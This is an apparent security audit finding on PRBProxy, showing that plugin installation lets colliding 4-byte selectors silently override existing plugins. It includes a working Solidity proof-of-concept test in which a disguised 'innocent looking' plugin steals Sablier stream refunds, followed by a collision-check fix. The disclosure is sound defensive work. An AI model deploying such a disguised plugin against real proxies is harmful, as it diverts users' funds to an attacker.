---
id: 5933
severity: "Critical"
---

# Plugins can be maliciously overridden by colliding signatures

## Description

Plugins are saved as a mapping from a 4byte selector to a given plugin address:
```solidity
mapping(bytes4 method => IPRBProxyPlugin plugin) public plugins;
```
When new plugins are installed, we call methodList() on the plugin, and then iterate through the list of selectors, and save the plugin address for each selector:
```solidity
function installPlugin(IPRBProxyPlugin plugin) external override {
    // Get the method list to install.
    bytes4[] memory methodList = plugin.methodList();
    // The plugin must have at least one listed method.
    uint256 length = methodList.length;
    if (length == 0) {
        revert PRBProxy_NoPluginMethods(plugin);
    }
    // Enable every method in the list.
    for (uint256 i = 0; i < length;) {
        plugins[methodList[i]] = plugin;
        unchecked {
            i += 1;
        }
    }
    // Log the plugin installation.
    emit InstallPlugin(plugin);
}
```
As a result, an innocent looking plugin can be crafted to intentionally override an existing plugin. When this happens, it will replace the existing plugin as the place where control flow is sent when this plugin in called. This is extremely dangerous, as it allows an attacker to skirt around the plugin's protections logic and get complete control over the proxy mid execution.

## Proof of Concept

There are many ways this could cause harm in various protocols using PRBProxy, but the simplest is to look at the Sablier integration. When a stream is cancelled by a receiver, Sablier sends the refund to the sender and then calls onStreamCanceled() on the sender contract. The Sablier defined plugin is used to forward these funds along to the owner of the proxy. However, a malicious plugin could be installed with a colliding 4byte selector that, instead, sends the funds to an attacker. Even worse, once the attacker has control flow on behalf of the plugin, they would be able to cancel all other active streams and steal the refundable amount of all of them, which could be devastating. Here is a test that can be dropped into periphery/test/integration/plugin/on-stream-canceled that emulates installing an innocent plugin to collect fees from an unrelated protocol, but results in the refund being sent to an attacker when a stream is canceled. As you will see, the test_PluginOverride function emulates the exact behavior of test_OnStreamCanceled in your own integration tests, but because the malicious plugin is installed first, an attacker is able to steal the funds.
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.19 <0.9.0;
import { LockupLinear } from "@sablier/v2-core/types/DataTypes.sol";
import { ISablierV2Lockup } from "@sablier/v2-core/interfaces/ISablierV2Lockup.sol";
import { ISablierV2ProxyPlugin } from "src/interfaces/ISablierV2ProxyPlugin.sol";
import { IPRBProxyPlugin } from "@prb/proxy/interfaces/IPRBProxyPlugin.sol";
import { Errors } from "src/libraries/Errors.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { Integration_Test } from "../../Integration.t.sol";

interface FeeController {
    function getAsset(uint) external view returns (IERC20);
}

contract InnocentLookingPlugin {
    address constant TREASURY = address(420);

    function methodList() external pure returns (bytes4[] memory methods) {
        methods = new bytes4[](1);
        methods[0] = this.onAddictionFeesRefunded.selector; // same as onStreamCanceled
    }

    function onAddictionFeesRefunded(uint248 loanId, int168, uint192 feeAmount, int248) public {
        // Get the asset of the loan.
        IERC20 asset = FeeController(msg.sender).getAsset(loanId);
        // Send fees to the treasury.
        asset.transfer({ to: TREASURY, amount: feeAmount });
    }
}

contract PluginOverrideTest is Integration_Test {
    uint256 internal streamId;

    function setUp() public virtual override {
        Integration_Test.setUp();
        installPlugin();
        streamId = createWithRange();
        // Lists the lockupLinear contract in the archive.
        changePrank({ msgSender: users.admin.addr });
        archive.list(address(lockupLinear));
        changePrank({ msgSender: users.alice.addr });
    }

    function test_PluginOverride() external {
        address ATTACKER = address(420);
        // install an innocent looking plugin, but that overrides the onStreamCanceled selector
        IPRBProxyPlugin innocentLookingPlugin = IPRBProxyPlugin(address(new InnocentLookingPlugin()));
        bytes memory data = abi.encodeCall(proxyAnnex.installPlugin, (innocentLookingPlugin));
        proxy.execute(address(proxyAnnex), data);
        // Retrieve the initial asset balances of the proxy owner and the attacker.
        uint256 aliceInitBalance = asset.balanceOf(users.alice.addr);
        uint256 attackerInitBalance = asset.balanceOf(ATTACKER);
        // Simulate the passage of time.
        vm.warp(defaults.CLIFF_TIME());
        // Make the recipient the caller so that Sablier calls the hook implemented by the plugin.
        changePrank({ msgSender: users.recipient.addr });
        // Asset flow: Sablier contract → proxy → ATTACKER!
        // Expect transfers from the Sablier contract to the proxy, and then from the proxy to the ATTACKER!
        expectCallToTransfer({ to: address(proxy), amount: defaults.REFUND_AMOUNT() });
        expectCallToTransfer({ to: ATTACKER, amount: defaults.REFUND_AMOUNT() });
        // Cancel the stream and trigger the plugin.
        lockupLinear.cancel(streamId);
        // Assert that Alice received no funds from the cancelation.
        uint256 aliceFinalBalance = asset.balanceOf(users.alice.addr);
        assertEq(aliceFinalBalance, aliceInitBalance, "balances do not match");
        // Assert that the ATTACKER got the refund amount.
        uint256 attackerFinalBalance = asset.balanceOf(ATTACKER);
        uint256 attackerExpectedBalance = attackerInitBalance + defaults.REFUND_AMOUNT();
        assertEq(attackerExpectedBalance, attackerFinalBalance, "balances do not match");
    }
}
```

## Recommendation

When plugins are installed, ensure that the 4byte selectors do not collide with any existing plugins.
```solidity
function installPlugin(IPRBProxyPlugin plugin) external override {
    // Get the method list to install.
    bytes4[] memory methodList = plugin.methodList();
    // The plugin must have at least one listed method.
    uint256 length = methodList.length;
    if (length == 0) {
        revert PRBProxy_NoPluginMethods(plugin);
    }
    // Enable every method in the list.
    for (uint256 i = 0; i < length;) {
        if (plugins[methodList[i]] != address(0)) revert PRBProxy_SelectorCollision(methodList[i]);
        plugins[methodList[i]] = plugin;
        unchecked {
            i += 1;
        }
    }
    // Log the plugin installation.
    emit InstallPlugin(plugin);
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability originates from the way the proxy stores plugins: a public mapping links each 4‑byte function selector to a plugin contract address. When a new plugin is installed, the installPlugin routine retrieves the list of selectors provided by the plugin and writes the plugin address into the mapping for every selector without checking whether a selector is already associated with another plugin. Consequently, a malicious actor can craft a seemingly harmless plugin that deliberately includes a selector already used by a legitimate plugin. During installation the new plugin overwrites the existing entry, so any subsequent call that matches the colliding selector is dispatched to the attacker‑controlled plugin instead of the intended one. This hijacks the control flow of the proxy mid‑execution, allowing the attacker to bypass the original plugin’s protection logic and execute arbitrary code under the proxy’s authority. In practice, the issue manifests when a protocol such as Sablier relies on a specific plugin hook (for example onStreamCanceled) to forward refunds to the rightful owner. If an attacker installs a plugin that declares the same selector, the refund is redirected to the attacker’s address, and the attacker may also gain the ability to cancel other streams and steal additional funds. The bug occurs whenever plugins are added without a collision check, affecting any user or contract that interacts with the proxy and expects the original plugin behavior, including stream participants, token holders, and protocol administrators. It was discovered during a security audit that examined the plugin installation logic and identified the lack of a selector‑collision guard. The problem is subtle because the mapping update looks innocuous and the overridden plugin may appear identical in name or purpose, making the malicious behavior hard to detect without tracing the actual execution path. To remediate, the installPlugin function should verify that each selector is unassigned before writing a new entry, rejecting any attempt to register a selector that already maps to a plugin. This preventive measure restores the invariant that each selector uniquely identifies a single plugin, preserving the intended accounting and refund logic of the system and preventing unauthorized redirection of funds.
